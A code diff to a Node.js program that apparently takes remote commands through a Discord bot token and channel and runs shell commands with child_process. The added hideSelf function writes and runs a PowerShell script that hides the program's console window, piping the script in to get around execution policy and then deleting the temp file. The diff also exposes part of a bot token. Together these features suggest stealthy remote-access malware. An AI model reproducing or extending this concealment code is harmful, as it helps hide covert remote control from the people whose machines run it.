@@ -13,6 +13,7 @@ const urss = require("os").userInfo().username;
 
 
 // Global settings
+const hideCnsl = true;
 const OnStart = true
 const TOKEN = "MTA1MDExNDQwOTc4O" // Your discord bot token
 const channelID = "105157433465601644" // Channel id for the messages.
@@ -93,7 +94,6 @@ const { exec } = require("child_process");
 const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder , Events, ModalBuilder, TextInputBuilder, TextInputStyle} = require('discord.js');
 var request = require('request');
 const client = new Client({ intents: [GatewayIntentBits.Guilds] });
-const ConsoleWindow = require("node-hide-console-window");
 
 
 
@@ -107,9 +107,37 @@ const ConsoleWindow = require("node-hide-console-window");
 
 */
 
+function hideSelf() {
 
-ConsoleWindow.hideConsole();
+    let powershellScript = `
+    Add-Type -Name Window -Namespace Console -MemberDefinition '
+    [DllImport("Kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
 
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+    '
+
+    $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
+    [Console.Window]::ShowWindow($consolePtr, 0)
+    `;
+
+    let workingDir = process.cwd();
+    let tempfile = `${workingDir}\\temp.ps1`;
+    fs.writeFileSync(tempfile, powershellScript);
+
+    //a little convoluted to get around powershell script execution policy (might be disabled)
+    require('child_process').execSync(`type .\\temp.ps1 | powershell.exe -noprofile -`, {stdio: 'inherit'});
+    fs.unlinkSync(tempfile); //delete temp file
+}
+
+
+
+
+
+
+if(hideCnsl === true){hideSelf()}
 
 
 /*
